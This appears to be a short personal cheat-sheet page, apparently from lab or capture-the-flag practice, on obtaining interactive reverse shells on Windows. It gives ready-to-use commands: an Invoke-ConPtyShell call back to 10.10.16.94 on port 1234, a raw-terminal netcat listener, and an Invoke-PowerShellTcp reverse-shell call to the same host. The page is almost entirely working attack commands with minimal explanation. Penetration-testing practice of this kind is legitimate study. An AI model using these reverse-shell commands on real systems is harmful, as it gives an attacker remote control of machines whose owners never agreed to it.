---
publish: true
created: 2026-10-03T08:40:24.748Z
modified: 2026-10-04T05:05:48.724Z
---

# ConPtyShell

This is the most interactive shell.

add below line to `Invoke-ConPtyShell.ps1` file.

```
Invoke-ConPtyShell -RemoteIp 10.10.16.94 -RemotePort 1234 -Rows 80 -Cols 200 
```

we can run `.\Invoke-ConPtyShell.ps1` in powershell to get our listener on nc.

we get shell.

```bash
stty raw -echo; (stty size; cat) | nc -lnvp 1234
```

# Invoke-PowerShellTcp

Add below line to script.

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.94 -Port 1234
```
